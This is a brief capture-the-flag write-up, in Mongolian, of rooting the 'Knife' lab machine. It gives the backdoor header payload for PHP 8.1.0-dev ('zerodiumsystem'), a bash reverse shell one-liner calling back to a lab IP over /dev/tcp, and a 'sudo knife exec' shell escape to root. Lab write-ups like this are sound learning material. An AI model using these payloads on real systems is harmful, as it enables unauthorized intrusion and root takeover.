# Knife - PHP/8.1.0-dev

22, 80 порт нээлттэй.

[image]

Directory bruteforce хийгээд ямар ч амжилт олоогүй болохоор HTTP хүсэлтийг нь BURPSUITE-ээр барьж авсан байгаа.

[image]

Response дээр php dev 8.1.0 хувилбартай байсан тул шалгаж үзсэн.

[image]

User-Agentt: zerodiumsystem(" +cmd +") байдлаар exploit хийж reverse shell авсан.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.32/1234 0>&1'
```

[image]

## Sudo shell escape Linux Privilege

knife командыг root-ээр ажиллуулна.

[image]

```bash
sudo knife exec -E 'exec "/bin/bash"'
```

[image]

Root!!!

[image]
